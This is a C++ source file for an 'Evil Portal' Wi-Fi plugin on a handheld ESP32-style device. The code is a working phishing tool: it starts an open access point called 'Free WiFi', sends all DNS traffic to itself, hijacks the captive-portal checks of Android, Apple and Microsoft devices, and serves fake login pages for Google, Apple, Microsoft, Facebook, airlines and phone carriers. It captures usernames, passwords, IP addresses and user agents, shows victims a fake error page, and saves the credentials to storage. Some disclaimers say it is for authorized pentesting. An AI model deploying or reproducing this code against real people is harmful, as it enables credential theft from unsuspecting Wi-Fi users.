/*
 * Evil Portal Plugin
 * WiFi captive portal for authorized penetration testing
 * 
 * WARNING: This tool is for educational and authorized testing purposes only.
 * Unauthorized use may violate local laws. Use responsibly and ethically.
 * 
 * Inspired by: https://github.com/bigbrodude6119/flipper-zero-evil-portal
 */

#include "plugin_api.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <vector>
#include <string>

// Plugin state
typedef struct {
    bool portal_active;
    bool dns_active;
    int selected_portal;
    int portal_count;
    uint32_t clients_connected;
    uint32_t credentials_captured;
    uint32_t last_update;
    
    // Portal templates
    struct {
        char name[64];
        char filename[128];
        char description[128];
        bool available;
    } portals[20];
    
    // Captured credentials
    struct {
        char username[64];
        char password[64];
        char ip_address[16];
        char user_agent[128];
        uint32_t timestamp;
    } credentials[50];
    
    // AP Configuration
    char ap_ssid[33];
    char ap_password[64];
    uint8_t ap_channel;
    bool ap_hidden;
    bool require_password;
    
    // UI state
    enum {
        STATE_MENU,
        STATE_PORTAL_SELECT,
        STATE_AP_CONFIG,
        STATE_RUNNING,
        STATE_CREDENTIALS,
        STATE_SETTINGS
    } ui_state;
    
    // Settings
    bool auto_save_creds;
    bool log_requests;
    uint16_t web_port;
    
} evil_portal_state_t;

// Web server and DNS server instances
static WebServer* webServer = nullptr;
static DNSServer* dnsServer = nullptr;

// Function prototypes
static bool evil_portal_init(plugin_context_t* ctx);
static void evil_portal_run(plugin_context_t* ctx);
static void evil_portal_cleanup(plugin_context_t* ctx);
static bool evil_portal_event_handler(plugin_context_t* ctx, uint32_t event, void* data);

// Internal functions
static void scan_portal_templates(evil_portal_state_t* state, const plugin_hal_t* hal);
static bool start_access_point(evil_portal_state_t* state);
static bool start_web_server(evil_portal_state_t* state, const plugin_hal_t* hal);
static bool start_dns_server(evil_portal_state_t* state);
static void stop_portal(evil_portal_state_t* state);
static void handle_web_requests(evil_portal_state_t* state);
static void save_credentials(evil_portal_state_t* state, const plugin_hal_t* hal);
static void draw_menu(evil_portal_state_t* state, const plugin_hal_t* hal);
static void draw_portal_select(evil_portal_state_t* state, const plugin_hal_t* hal);
static void draw_ap_config(evil_portal_state_t* state, const plugin_hal_t* hal);
static void draw_running_status(evil_portal_state_t* state, const plugin_hal_t* hal);
static void draw_credentials(evil_portal_state_t* state, const plugin_hal_t* hal);
static void draw_settings(evil_portal_state_t* state, const plugin_hal_t* hal);
static String load_portal_template(const char* filename, const plugin_hal_t* hal);
static void create_default_portals(const plugin_hal_t* hal);

// Web server handlers
static void handleRoot();
static void handleLogin();
static void handleCaptivePortal();
static void handleNotFound();

// Global state pointer for web handlers
static evil_portal_state_t* g_portal_state = nullptr;
static const plugin_hal_t* g_hal = nullptr;

// Plugin manifest
static plugin_manifest_t evil_portal_manifest = PLUGIN_MANIFEST(
    "Evil Portal",
    "1.0.0",
    "Izod Mini Team",
    PLUGIN_CATEGORY_PENTEST,
    evil_portal_init,
    evil_portal_run,
    evil_portal_cleanup
);

// Plugin initialization
static bool evil_portal_init(plugin_context_t* ctx) {
    if (!ctx) return false;
    
    // Allocate plugin state
    evil_portal_state_t* state = (evil_portal_state_t*)malloc(sizeof(evil_portal_state_t));
    if (!state) return false;
    
    // Initialize state
    memset(state, 0, sizeof(evil_portal_state_t));
    state->ui_state = STATE_MENU;
    state->selected_portal = 0;
    strcpy(state->ap_ssid, "Free WiFi");
    strcpy(state->ap_password, "");
    state->ap_channel = 1;
    state->ap_hidden = false;
    state->require_password = false;
    state->auto_save_creds = true;
    state->log_requests = true;
    state->web_port = 80;
    
    ctx->private_data = state;
    ctx->private_data_size = sizeof(evil_portal_state_t);
    
    // Set global state for web handlers
    g_portal_state = state;
    g_hal = plugin_get_hal();
    
    // Create default portal templates if they don't exist
    create_default_portals(g_hal);
    
    // Scan for available portal templates
    scan_portal_templates(state, g_hal);
    
    const plugin_hal_t* hal = plugin_get_hal();
    if (hal && hal->system) {
        hal->system->log("INFO", "Evil Portal initialized");
        hal->system->log("WARN", "Educational use only - Use responsibly!");
    }
    
    return true;
}

// Plugin main loop
static void evil_portal_run(plugin_context_t* ctx) {
    if (!ctx || !ctx->private_data) return;
    
    evil_portal_state_t* state = (evil_portal_state_t*)ctx->private_data;
    const plugin_hal_t* hal = plugin_get_hal();
    if (!hal) return;
    
    uint32_t now = hal->system->get_time_ms();
    
    // Handle web server requests
    if (state->portal_active && webServer) {
        webServer->handleClient();
    }
    
    // Handle DNS server requests
    if (state->dns_active && dnsServer) {
        dnsServer->processNextRequest();
    }
    
    // Update client count
    if (state->portal_active && (now - state->last_update > 5000)) {
        state->clients_connected = WiFi.softAPgetStationNum();
        state->last_update = now;
    }
    
    // Update display every 100ms
    static uint32_t last_display_update = 0;
    if (now - last_display_update > 100) {
        hal->display->clear(PLUGIN_COLOR_BLACK);
        
        switch (state->ui_state) {
            case STATE_MENU:
                draw_menu(state, hal);
                break;
            case STATE_PORTAL_SELECT:
                draw_portal_select(state, hal);
                break;
            case STATE_AP_CONFIG:
                draw_ap_config(state, hal);
                break;
            case STATE_RUNNING:
                draw_running_status(state, hal);
                break;
            case STATE_CREDENTIALS:
                draw_credentials(state, hal);
                break;
            case STATE_SETTINGS:
                draw_settings(state, hal);
                break;
        }
        
        // Warning footer
        hal->display->text(10, 300, "Authorized testing only!", PLUGIN_COLOR_RED, 1);
        
        hal->display->update();
        last_display_update = now;
    }
    
    hal->system->delay_ms(10);
}

// Plugin cleanup
static void evil_portal_cleanup(plugin_context_t* ctx) {
    if (!ctx || !ctx->private_data) return;
    
    evil_portal_state_t* state = (evil_portal_state_t*)ctx->private_data;
    
    // Stop portal
    stop_portal(state);
    
    // Clear global state
    g_portal_state = nullptr;
    g_hal = nullptr;
    
    const plugin_hal_t* hal = plugin_get_hal();
    if (hal && hal->system) {
        hal->system->log("INFO", "Evil Portal cleanup");
    }
    
    free(ctx->private_data);
    ctx->private_data = nullptr;
    ctx->private_data_size = 0;
}

// Plugin event handler
static bool evil_portal_event_handler(plugin_context_t* ctx, uint32_t event, void* data) {
    if (!ctx || !ctx->private_data) return false;
    
    evil_portal_state_t* state = (evil_portal_state_t*)ctx->private_data;
    const plugin_hal_t* hal = plugin_get_hal();
    
    if (event == PLUGIN_EVENT_BUTTON_PRESS) {
        plugin_button_event_t* btn_event = (plugin_button_event_t*)data;
        if (!btn_event) return false;
        
        switch (btn_event->button_id) {
            case PLUGIN_BUTTON_MENU:
                // Exit plugin
                return false;
                
            case PLUGIN_BUTTON_SELECT:
                switch (state->ui_state) {
                    case STATE_MENU:
                        switch (state->selected_portal) {
                            case 0: // Select Portal
                                state->ui_state = STATE_PORTAL_SELECT;
                                state->selected_portal = 0;
                                break;
                            case 1: // Configure AP
                                state->ui_state = STATE_AP_CONFIG;
                                state->selected_portal = 0;
                                break;
                            case 2: // Start Portal
                                if (start_access_point(state) && 
                                    start_web_server(state, hal) && 
                                    start_dns_server(state)) {
                                    state->ui_state = STATE_RUNNING;
                                }
                                break;
                            case 3: // View Credentials
                                state->ui_state = STATE_CREDENTIALS;
                                state->selected_portal = 0;
                                break;
                            case 4: // Settings
                                state->ui_state = STATE_SETTINGS;
                                state->selected_portal = 0;
                                break;
                        }
                        break;
                        
                    case STATE_PORTAL_SELECT:
                        // Portal selected, go back to menu
                        state->ui_state = STATE_MENU;
                        state->selected_portal = 0;
                        break;
                        
                    case STATE_RUNNING:
                        // Stop portal
                        stop_portal(state);
                        state->ui_state = STATE_MENU;
                        state->selected_portal = 0;
                        break;
                }
                break;
                
            case PLUGIN_BUTTON_PREVIOUS:
                switch (state->ui_state) {
                    case STATE_MENU:
                        state->selected_portal = (state->selected_portal - 1 + 5) % 5;
                        break;
                    case STATE_PORTAL_SELECT:
                        if (state->portal_count > 0) {
                            state->selected_portal = (state->selected_portal - 1 + state->portal_count) % state->portal_count;
                        }
                        break;
                    case STATE_CREDENTIALS:
                        if (state->credentials_captured > 0) {
                            state->selected_portal = (state->selected_portal - 1 + state->credentials_captured) % state->credentials_captured;
                        }
                        break;
                    case STATE_SETTINGS:
                        state->selected_portal = (state->selected_portal - 1 + 3) % 3;
                        break;
                }
                break;
                
            case PLUGIN_BUTTON_NEXT:
                switch (state->ui_state) {
                    case STATE_MENU:
                        state->selected_portal = (state->selected_portal + 1) % 5;
                        break;
                    case STATE_PORTAL_SELECT:
                        if (state->portal_count > 0) {
                            state->selected_portal = (state->selected_portal + 1) % state->portal_count;
                        }
                        break;
                    case STATE_CREDENTIALS:
                        if (state->credentials_captured > 0) {
                            state->selected_portal = (state->selected_portal + 1) % state->credentials_captured;
                        }
                        break;
                    case STATE_SETTINGS:
                        state->selected_portal = (state->selected_portal + 1) % 3;
                        break;
                }
                break;
                
            case PLUGIN_BUTTON_PLAY:
                // Back
                switch (state->ui_state) {
                    case STATE_PORTAL_SELECT:
                    case STATE_AP_CONFIG:
                    case STATE_CREDENTIALS:
                    case STATE_SETTINGS:
                        state->ui_state = STATE_MENU;
                        state->selected_portal = 0;
                        break;
                    case STATE_RUNNING:
                        // Save credentials before going back
                        if (state->credentials_captured > 0) {
                            save_credentials(state, hal);
                        }
                        break;
                }
                break;
        }
        
        return true;
    }
    
    return false;
}

// Internal functions
static void scan_portal_templates(evil_portal_state_t* state, const plugin_hal_t* hal) {
    if (!hal || !hal->storage) return;
    
    state->portal_count = 0;
    
    // Popular imported portals from Flipper Zero Evil Portal project
    const char* portal_configs[][3] = {
        {"Google Modern", "/Pentest/portals/Google_Modern.html", "Modern Google login page"},
        {"Apple ID", "/Pentest/portals/apple.html", "Apple ID authentication"},
        {"Microsoft", "/Pentest/portals/Microsoft.html", "Microsoft account login"},
        {"Facebook", "/Pentest/portals/Facebook.html", "Facebook social login"},
        {"Twitter", "/Pentest/portals/Twitter.html", "Twitter/X social login"},
        {"Amazon", "/Pentest/portals/Amazon.html", "Amazon account login"},
        {"Starlink", "/Pentest/portals/Starlink.html", "Starlink internet service"},
        {"T-Mobile", "/Pentest/portals/T_Mobile.html", "T-Mobile carrier login"},
        {"Verizon", "/Pentest/portals/Verizon.html", "Verizon carrier login"},
        {"AT&T", "/Pentest/portals/at&t.html", "AT&T carrier login"},
        {"Spectrum", "/Pentest/portals/Spectrum.html", "Spectrum internet service"},
        {"Southwest Air", "/Pentest/portals/southwest_airline.html", "Southwest Airlines WiFi"},
        {"Delta Air", "/Pentest/portals/detla_airline.html", "Delta Airlines WiFi"},
        {"United Air", "/Pentest/portals/united_airline.html", "United Airlines WiFi"},
        {"American Air", "/Pentest/portals/american_airline.html", "American Airlines WiFi"},
        {"JetBlue", "/Pentest/portals/Jet_Blue.html", "JetBlue Airlines WiFi"},
        {"Alaska Air", "/Pentest/portals/AlaskaAirline.html", "Alaska Airlines WiFi"},
        {"Spirit Air", "/Pentest/portals/SpiritAirlines.html", "Spirit Airlines WiFi"},
        {"Twitch", "/Pentest/portals/Twitch.html", "Twitch streaming platform"},
        {"Matrix", "/Pentest/portals/Matrix.html", "Matrix-themed portal"}
    };
    
    int max_portals = sizeof(portal_configs) / sizeof(portal_configs[0]);
    if (max_portals > 20) max_portals = 20; // Limit to array size
    
    for (int i = 0; i < max_portals; i++) {
        strcpy(state->portals[i].name, portal_configs[i][0]);
        strcpy(state->portals[i].filename, portal_configs[i][1]);
        strcpy(state->portals[i].description, portal_configs[i][2]);
        state->portals[i].available = hal->storage->exists(state->portals[i].filename);
        state->portal_count++;
    }
}

static bool start_access_point(evil_portal_state_t* state) {
    WiFi.mode(WIFI_AP);
    
    bool success;
    if (state->require_password && strlen(state->ap_password) > 0) {
        success = WiFi.softAP(state->ap_ssid, state->ap_password, state->ap_channel, state->ap_hidden);
    } else {
        success = WiFi.softAP(state->ap_ssid, NULL, state->ap_channel, state->ap_hidden);
    }
    
    if (success) {
        // Configure IP address
        IPAddress local_ip(192, 168, 4, 1);
        IPAddress gateway(192, 168, 4, 1);
        IPAddress subnet(255, 255, 255, 0);
        WiFi.softAPConfig(local_ip, gateway, subnet);
        
        if (g_hal && g_hal->system) {
            g_hal->system->log("INFO", "Access Point started");
        }
    }
    
    return success;
}

static bool start_web_server(evil_portal_state_t* state, const plugin_hal_t* hal) {
    if (webServer) {
        delete webServer;
    }
    
    webServer = new WebServer(state->web_port);
    
    // Set up routes
    webServer->on("/", handleRoot);
    webServer->on("/get", HTTP_GET, handleLogin);        // Standard portal endpoint (Flipper Zero format)
    webServer->on("/generate_204", handleCaptivePortal); // Android
    webServer->on("/fwlink", handleCaptivePortal);       // Microsoft
    webServer->on("/hotspot-detect.html", handleCaptivePortal); // Apple
    webServer->onNotFound(handleNotFound);
    
    webServer->begin();
    
    if (hal && hal->system) {
        hal->system->log("INFO", "Web server started");
    }
    
    return true;
}

static bool start_dns_server(evil_portal_state_t* state) {
    if (dnsServer) {
        delete dnsServer;
    }
    
    dnsServer = new DNSServer();
    
    // Redirect all DNS queries to our AP IP
    IPAddress local_ip(192, 168, 4, 1);
    dnsServer->start(53, "*", local_ip);
    
    state->dns_active = true;
    
    if (g_hal && g_hal->system) {
        g_hal->system->log("INFO", "DNS server started");
    }
    
    return true;
}

static void stop_portal(evil_portal_state_t* state) {
    state->portal_active = false;
    state->dns_active = false;
    
    if (webServer) {
        webServer->stop();
        delete webServer;
        webServer = nullptr;
    }
    
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    
    if (g_hal && g_hal->system) {
        g_hal->system->log("INFO", "Portal stopped");
    }
}

static void save_credentials(evil_portal_state_t* state, const plugin_hal_t* hal) {
    if (!hal || !hal->storage || state->credentials_captured == 0) return;
    
    // Create filename with timestamp
    char filename[64];
    snprintf(filename, sizeof(filename), "/Pentest/portals/credentials_%lu.txt", millis());
    
    void* file = hal->storage->open(filename, "w");
    if (!file) return;
    
    // Write header
    const char* header = "Evil Portal Captured Credentials\n";
    hal->storage->write(file, header, strlen(header));
    
    const char* separator = "=====================================\n";
    hal->storage->write(file, separator, strlen(separator));
    
    // Write credentials
    for (uint32_t i = 0; i < state->credentials_captured; i++) {
        char entry[512];
        snprintf(entry, sizeof(entry), 
                 "Entry %lu:\n"
                 "Username: %s\n"
                 "Password: %s\n"
                 "IP Address: %s\n"
                 "User Agent: %s\n"
                 "Timestamp: %lu\n"
                 "-------------------------------------\n",
                 i + 1,
                 state->credentials[i].username,
                 state->credentials[i].password,
                 state->credentials[i].ip_address,
                 state->credentials[i].user_agent,
                 state->credentials[i].timestamp);
        
        hal->storage->write(file, entry, strlen(entry));
    }
    
    hal->storage->close(file);
    
    if (hal->system) {
        hal->system->log("INFO", "Credentials saved");
    }
}

// Web server handlers
static void handleRoot() {
    if (!g_portal_state || !g_hal) {
        webServer->send(500, "text/plain", "Server Error");
        return;
    }
    
    // Load selected portal template
    String portal_html = load_portal_template(
        g_portal_state->portals[g_portal_state->selected_portal].filename, g_hal);
    
    if (portal_html.length() == 0) {
        // Fallback to basic portal
        portal_html = "<!DOCTYPE html><html><head><title>WiFi Login</title></head>"
                     "<body><h1>WiFi Access</h1>"
                     "<form method='post' action='/login'>"
                     "Username: <input type='text' name='username'><br>"
                     "Password: <input type='password' name='password'><br>"
                     "<input type='submit' value='Login'>"
                     "</form></body></html>";
    }
    
    webServer->send(200, "text/html", portal_html);
    
    if (g_portal_state->log_requests && g_hal && g_hal->system) {
        g_hal->system->log("INFO", "Portal page served");
    }
}

static void handleLogin() {
    if (!g_portal_state || !g_hal) {
        webServer->send(500, "text/plain", "Server Error");
        return;
    }
    
    // Capture credentials using standard Flipper Zero Evil Portal format
    if (g_portal_state->credentials_captured < 50) {
        uint32_t idx = g_portal_state->credentials_captured;
        
        // Standard format: email and password parameters
        String email = webServer->arg("email");
        String password = webServer->arg("password");
        
        // Also capture alternative field names used by some portals
        if (email.length() == 0) {
            email = webServer->arg("uname");        // Some portals use 'uname'
        }
        if (email.length() == 0) {
            email = webServer->arg("username");     // Some portals use 'username'
        }
        if (email.length() == 0) {
            email = webServer->arg("user");         // Some portals use 'user'
        }
        
        strncpy(g_portal_state->credentials[idx].username, email.c_str(), 63);
        strncpy(g_portal_state->credentials[idx].password, password.c_str(), 63);
        strncpy(g_portal_state->credentials[idx].ip_address, 
                webServer->client().remoteIP().toString().c_str(), 15);
        strncpy(g_portal_state->credentials[idx].user_agent, 
                webServer->header("User-Agent").c_str(), 127);
        g_portal_state->credentials[idx].timestamp = millis();
        
        g_portal_state->credentials_captured++;
        
        if (g_hal && g_hal->system) {
            char log_msg[128];
            snprintf(log_msg, sizeof(log_msg), "Credentials captured: %s", email.c_str());
            g_hal->system->log("INFO", log_msg);
        }
    }
    
    // Redirect to success page or show error (standard response)
    String response = "<!DOCTYPE html><html><head><title>Connection Error</title>"
                     "<meta name='viewport' content='width=device-width, initial-scale=1'>"
                     "<style>body{font-family:Arial;text-align:center;padding:20px;background:#f5f5f5;}"
                     ".container{background:white;padding:30px;border-radius:10px;max-width:400px;margin:0 auto;}"
                     ".error{color:#e74c3c;margin:20px 0;}</style></head>"
                     "<body><div class='container'><h1>Connection Error</h1>"
                     "<p class='error'>Unable to connect to the authentication server.</p>"
                     "<p>Please check your credentials and try again.</p>"
                     "<a href='/' style='color:#3498db;text-decoration:none;'>← Back to Login</a>"
                     "</div></body></html>";
    
    webServer->send(200, "text/html", response);
}

static void handleCaptivePortal() {
    handleRoot(); // Redirect captive portal detection to main page
}

static void handleNotFound() {
    handleRoot(); // Redirect all unknown requests to main page
}

static String load_portal_template(const char* filename, const plugin_hal_t* hal) {
    if (!hal || !hal->storage || !hal->storage->exists(filename)) {
        return "";
    }
    
    void* file = hal->storage->open(filename, "r");
    if (!file) return "";
    
    String content = "";
    char buffer[256];
    size_t bytes_read;
    
    while ((bytes_read = hal->storage->read(file, buffer, sizeof(buffer) - 1)) > 0) {
        buffer[bytes_read] = '\0';
        content += buffer;
    }
    
    hal->storage->close(file);
    return content;
}

static void create_default_portals(const plugin_hal_t* hal) {
    if (!hal || !hal->storage) return;
    
    // Ensure portals directory exists
    if (!hal->storage->exists("/Pentest")) {
        hal->storage->mkdir("/Pentest");
    }
    if (!hal->storage->exists("/Pentest/portals")) {
        hal->storage->mkdir("/Pentest/portals");
    }
    
    // Create WiFi login portal
    if (!hal->storage->exists("/Pentest/portals/wifi_login.html")) {
        void* file = hal->storage->open("/Pentest/portals/wifi_login.html", "w");
        if (file) {
            const char* html = "<!DOCTYPE html>\n"
                "<html><head><title>WiFi Login</title>\n"
                "<meta name='viewport' content='width=device-width, initial-scale=1'>\n"
                "<style>body{font-family:Arial;text-align:center;padding:20px;}\n"
                "input{margin:10px;padding:10px;width:200px;}\n"
                "button{padding:10px 20px;background:#007cba;color:white;border:none;}\n"
                "</style></head><body>\n"
                "<h1>WiFi Network Access</h1>\n"
                "<p>Please enter your credentials to access the internet</p>\n"
                "<form method='post' action='/login'>\n"
                "<input type='text' name='username' placeholder='Username' required><br>\n"
                "<input type='password' name='password' placeholder='Password' required><br>\n"
                "<button type='submit'>Connect</button>\n"
                "</form></body></html>";
            
            hal->storage->write(file, html, strlen(html));
            hal->storage->close(file);
        }
    }
    
    // Create hotel WiFi portal
    if (!hal->storage->exists("/Pentest/portals/hotel_wifi.html")) {
        void* file = hal->storage->open("/Pentest/portals/hotel_wifi.html", "w");
        if (file) {
            const char* html = "<!DOCTYPE html>\n"
                "<html><head><title>Hotel WiFi</title>\n"
                "<meta name='viewport' content='width=device-width, initial-scale=1'>\n"
                "<style>body{font-family:Arial;text-align:center;padding:20px;background:#f5f5f5;}\n"
                ".container{background:white;padding:30px;border-radius:10px;max-width:400px;margin:0 auto;}\n"
                "input{margin:10px;padding:12px;width:90%;border:1px solid #ddd;}\n"
                "button{padding:12px 30px;background:#d4a574;color:white;border:none;border-radius:5px;}\n"
                "</style></head><body>\n"
                "<div class='container'>\n"
                "<h1>🏨 Hotel Guest WiFi</h1>\n"
                "<p>Welcome! Please enter your room credentials</p>\n"
                "<form method='post' action='/login'>\n"
                "<input type='text' name='username' placeholder='Room Number' required><br>\n"
                "<input type='password' name='password' placeholder='Last Name' required><br>\n"
                "<button type='submit'>Access Internet</button>\n"
                "</form></div></body></html>";
            
            hal->storage->write(file, html, strlen(html));
            hal->storage->close(file);
        }
    }
}

// Drawing functions
static void draw_menu(evil_portal_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "Evil Portal", PLUGIN_COLOR_WHITE, 2);
    
    const char* menu_items[] = {
        "Select Portal",
        "Configure AP", 
        "Start Portal",
        "View Credentials",
        "Settings"
    };
    
    for (int i = 0; i < 5; i++) {
        uint16_t color = (i == state->selected_portal) ? PLUGIN_COLOR_GREEN : PLUGIN_COLOR_WHITE;
        hal->display->text(20, 50 + i * 20, menu_items[i], color, 1);
        
        if (i == state->selected_portal) {
            hal->display->text(10, 50 + i * 20, ">", PLUGIN_COLOR_GREEN, 1);
        }
    }
    
    // Status info
    char status[50];
    snprintf(status, sizeof(status), "Portals: %d  Credentials: %lu", 
             state->portal_count, state->credentials_captured);
    hal->display->text(10, 180, status, PLUGIN_COLOR_GRAY, 1);
    
    // Current AP config
    char ap_info[40];
    snprintf(ap_info, sizeof(ap_info), "AP: %s (Ch %d)", state->ap_ssid, state->ap_channel);
    hal->display->text(10, 200, ap_info, PLUGIN_COLOR_GRAY, 1);
    
    // Instructions
    hal->display->text(10, 240, "Select: Choose option", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 260, "Menu: Exit", PLUGIN_COLOR_GRAY, 1);
}

static void draw_portal_select(evil_portal_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "Select Portal", PLUGIN_COLOR_WHITE, 2);
    
    if (state->portal_count == 0) {
        hal->display->text(10, 50, "No portals found", PLUGIN_COLOR_RED, 1);
        return;
    }
    
    // Show portal list
    int start_idx = max(0, state->selected_portal - 4);
    int end_idx = min(state->portal_count, start_idx + 8);
    
    for (int i = start_idx; i < end_idx; i++) {
        int y = 40 + (i - start_idx) * 20;
        uint16_t color = (i == state->selected_portal) ? PLUGIN_COLOR_GREEN : PLUGIN_COLOR_WHITE;
        
        if (i == state->selected_portal) {
            hal->display->text(5, y, ">", PLUGIN_COLOR_GREEN, 1);
        }
        
        // Portal name
        hal->display->text(15, y, state->portals[i].name, color, 1);
        
        // Availability indicator
        if (state->portals[i].available) {
            hal->display->text(200, y, "✓", PLUGIN_COLOR_GREEN, 1);
        } else {
            hal->display->text(200, y, "✗", PLUGIN_COLOR_RED, 1);
        }
    }
    
    // Description of selected portal
    if (state->selected_portal < state->portal_count) {
        hal->display->text(10, 220, "Description:", PLUGIN_COLOR_WHITE, 1);
        hal->display->text(10, 240, state->portals[state->selected_portal].description, PLUGIN_COLOR_GRAY, 1);
    }
    
    hal->display->text(10, 280, "Select: Choose  Play: Back", PLUGIN_COLOR_GRAY, 1);
}

static void draw_running_status(evil_portal_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "PORTAL ACTIVE", PLUGIN_COLOR_GREEN, 2);
    
    // AP info
    hal->display->text(10, 40, "Access Point:", PLUGIN_COLOR_WHITE, 1);
    hal->display->text(10, 60, state->ap_ssid, PLUGIN_COLOR_YELLOW, 1);
    
    char ap_details[40];
    snprintf(ap_details, sizeof(ap_details), "Channel: %d  IP: 192.168.4.1", state->ap_channel);
    hal->display->text(10, 80, ap_details, PLUGIN_COLOR_WHITE, 1);
    
    // Client info
    char client_info[30];
    snprintf(client_info, sizeof(client_info), "Connected clients: %lu", state->clients_connected);
    hal->display->text(10, 110, client_info, PLUGIN_COLOR_CYAN, 1);
    
    // Credentials captured
    char cred_info[30];
    snprintf(cred_info, sizeof(cred_info), "Credentials captured: %lu", state->credentials_captured);
    hal->display->text(10, 130, cred_info, PLUGIN_COLOR_GREEN, 1);
    
    // Portal info
    hal->display->text(10, 160, "Active portal:", PLUGIN_COLOR_WHITE, 1);
    if (state->selected_portal < state->portal_count) {
        hal->display->text(10, 180, state->portals[state->selected_portal].name, PLUGIN_COLOR_YELLOW, 1);
    }
    
    // Status indicator
    int blink = (millis() / 500) % 2;
    if (blink) {
        hal->display->fill_circle(200, 50, 8, PLUGIN_COLOR_GREEN);
    }
    hal->display->text(180, 65, "ACTIVE", PLUGIN_COLOR_GREEN, 1);
    
    // Instructions
    hal->display->text(10, 240, "Select: Stop portal", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 260, "Play: Save credentials", PLUGIN_COLOR_GRAY, 1);
}

static void draw_credentials(evil_portal_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "Captured Credentials", PLUGIN_COLOR_WHITE, 2);
    
    if (state->credentials_captured == 0) {
        hal->display->text(10, 50, "No credentials captured", PLUGIN_COLOR_RED, 1);
        hal->display->text(10, 70, "Press Play to go back", PLUGIN_COLOR_GRAY, 1);
        return;
    }
    
    char count_info[30];
    snprintf(count_info, sizeof(count_info), "Total: %lu", state->credentials_captured);
    hal->display->text(10, 35, count_info, PLUGIN_COLOR_GRAY, 1);
    
    // Show selected credential
    if (state->selected_portal < state->credentials_captured) {
        auto& cred = state->credentials[state->selected_portal];
        
        char entry_info[20];
        snprintf(entry_info, sizeof(entry_info), "Entry %d/%lu:", 
                 state->selected_portal + 1, state->credentials_captured);
        hal->display->text(10, 60, entry_info, PLUGIN_COLOR_WHITE, 1);
        
        hal->display->text(10, 80, "Username:", PLUGIN_COLOR_WHITE, 1);
        hal->display->text(80, 80, cred.username, PLUGIN_COLOR_YELLOW, 1);
        
        hal->display->text(10, 100, "Password:", PLUGIN_COLOR_WHITE, 1);
        hal->display->text(80, 100, cred.password, PLUGIN_COLOR_YELLOW, 1);
        
        hal->display->text(10, 120, "IP:", PLUGIN_COLOR_WHITE, 1);
        hal->display->text(40, 120, cred.ip_address, PLUGIN_COLOR_CYAN, 1);
        
        hal->display->text(10, 140, "User Agent:", PLUGIN_COLOR_WHITE, 1);
        // Truncate user agent for display
        char ua_short[30];
        strncpy(ua_short, cred.user_agent, 29);
        ua_short[29] = '\0';
        hal->display->text(10, 160, ua_short, PLUGIN_COLOR_GRAY, 1);
        
        uint32_t age = (millis() - cred.timestamp) / 1000;
        char time_info[30];
        snprintf(time_info, sizeof(time_info), "Captured: %lu sec ago", age);
        hal->display->text(10, 180, time_info, PLUGIN_COLOR_GRAY, 1);
    }
    
    hal->display->text(10, 240, "Prev/Next: Navigate", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 260, "Play: Back", PLUGIN_COLOR_GRAY, 1);
}

static void draw_ap_config(evil_portal_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "AP Configuration", PLUGIN_COLOR_WHITE, 2);
    
    hal->display->text(10, 40, "SSID:", PLUGIN_COLOR_WHITE, 1);
    hal->display->text(60, 40, state->ap_ssid, PLUGIN_COLOR_YELLOW, 1);
    
    char channel_info[20];
    snprintf(channel_info, sizeof(channel_info), "Channel: %d", state->ap_channel);
    hal->display->text(10, 60, channel_info, PLUGIN_COLOR_WHITE, 1);
    
    hal->display->text(10, 80, "Security:", PLUGIN_COLOR_WHITE, 1);
    const char* security = state->require_password ? "WPA2" : "Open";
    hal->display->text(80, 80, security, PLUGIN_COLOR_WHITE, 1);
    
    if (state->require_password) {
        hal->display->text(10, 100, "Password:", PLUGIN_COLOR_WHITE, 1);
        hal->display->text(80, 100, state->ap_password, PLUGIN_COLOR_YELLOW, 1);
    }
    
    hal->display->text(10, 120, "Hidden:", PLUGIN_COLOR_WHITE, 1);
    const char* hidden = state->ap_hidden ? "Yes" : "No";
    hal->display->text(70, 120, hidden, PLUGIN_COLOR_WHITE, 1);
    
    hal->display->text(10, 160, "Note: Configuration editing", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 180, "requires advanced UI controls", PLUGIN_COLOR_GRAY, 1);
    
    hal->display->text(10, 260, "Play: Back", PLUGIN_COLOR_GRAY, 1);
}

static void draw_settings(evil_portal_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "Portal Settings", PLUGIN_COLOR_WHITE, 2);
    
    const char* settings[] = {
        "Auto Save Credentials",
        "Log Requests",
        "Web Port"
    };
    
    for (int i = 0; i < 3; i++) {
        uint16_t color = (i == state->selected_portal) ? PLUGIN_COLOR_GREEN : PLUGIN_COLOR_WHITE;
        hal->display->text(20, 50 + i * 25, settings[i], color, 1);
        
        if (i == state->selected_portal) {
            hal->display->text(10, 50 + i * 25, ">", PLUGIN_COLOR_GREEN, 1);
        }
        
        // Setting values
        char value[20];
        switch (i) {
            case 0:
                strcpy(value, state->auto_save_creds ? "ON" : "OFF");
                break;
            case 1:
                strcpy(value, state->log_requests ? "ON" : "OFF");
                break;
            case 2:
                snprintf(value, sizeof(value), "%d", state->web_port);
                break;
        }
        hal->display->text(180, 50 + i * 25, value, color, 1);
    }
    
    hal->display->text(10, 200, "Play: Back", PLUGIN_COLOR_GRAY, 1);
}

// Plugin entry point
extern "C" {
    const plugin_manifest_t* plugin_get_manifest(void) {
        evil_portal_manifest.event_handler = evil_portal_event_handler;
        evil_portal_manifest.compatibility_flags = PLUGIN_COMPAT_TFT_DISPLAY | PLUGIN_COMPAT_PHYSICAL_BTNS | PLUGIN_COMPAT_WIFI;
        evil_portal_manifest.memory_required = 20480;
        
        strncpy((char*)evil_portal_manifest.description,
                "WiFi captive portal for authorized penetration testing with selectable templates",
                PLUGIN_DESC_MAX_LENGTH - 1);
        
        return &evil_portal_manifest;
    }
}
